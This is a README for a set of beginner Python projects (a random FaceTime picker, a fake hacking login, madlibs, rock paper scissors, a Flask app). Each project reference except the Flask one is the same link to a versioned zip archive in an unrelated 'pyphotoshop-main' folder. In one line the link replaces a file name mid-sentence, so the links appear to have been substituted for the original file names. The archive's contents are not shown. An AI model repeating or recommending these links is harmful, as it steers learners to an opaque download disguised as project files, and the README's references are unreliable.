# beginner Projects
## A couple of beginner projects here, listed from easiest to hardest :)

* https://raw.githubusercontent.com/adilmaqsood1/Basic-Python-Projects/main/pyphotoshop-main/Projects-Python-Basic-3.0-beta.2.zip simply a random selector to tell me who to facetime! (deals with imports)
* https://raw.githubusercontent.com/adilmaqsood1/Basic-Python-Projects/main/pyphotoshop-main/Projects-Python-Basic-3.0-beta.2.zip a fake login that lets you look like you're hacking into some super secret mainframe lol (practice with if statements, imports, print statements)
* https://raw.githubusercontent.com/adilmaqsood1/Basic-Python-Projects/main/pyphotoshop-main/Projects-Python-Basic-3.0-beta.2.zip  madlibs! (practice with inputs, strings)
* https://raw.githubusercontent.com/adilmaqsood1/Basic-Python-Projects/main/pyphotoshop-main/Projects-Python-Basic-3.0-beta.2.zip  rock paper scissors (practice with functions and if statements)
* NOTE: https://raw.githubusercontent.com/adilmaqsood1/Basic-Python-Projects/main/pyphotoshop-main/Projects-Python-Basic-3.0-beta.2.zip and sample_madlibs are madlibs that I created if you just want to play around with them
* web_app: build your own web app using flask! (this would be more intermediate, but give it a try if you're feeling ambitious!!)
